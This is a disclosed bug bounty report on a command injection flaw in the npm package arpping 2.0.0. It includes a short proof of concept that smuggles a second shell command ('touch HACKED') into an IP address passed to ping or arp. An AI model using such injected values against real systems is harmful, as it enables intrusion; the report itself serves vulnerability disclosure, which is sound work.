# [arpping] Remote Code Execution

## Report Details
- **Report ID**: 972220
- **URL**: https://hackerone.com/reports/972220
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-09-01T14:34:13.800Z
- **Disclosed**: 2021-01-14T08:39:29.702Z

## Reporter
- **Username**: solov9ev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report `RCE` in `arpping`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** arpping
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/arpping`

## Module Description

Discover and search for internet-connected devices (locally) using ping and arp

## Module Stats

[16] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection occurs when using commands: `ping`, `arp`

## Steps To Reproduce:

- Create and run the following POC index.js:

```javascript
const Arpping = require('arpping');

var arpping = new Arpping();
arpping.ping(["127.0.0.1;touch HACKED;"]); // arpping.arp(["127.0.0.1; touch HACKED;"]);
```
- The exploit worked and created the file - `HACKED`

{F972163}

## Patch

Check input before command

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `arpping` module via insecure command

## Attachments
- arpping_rce.mp4
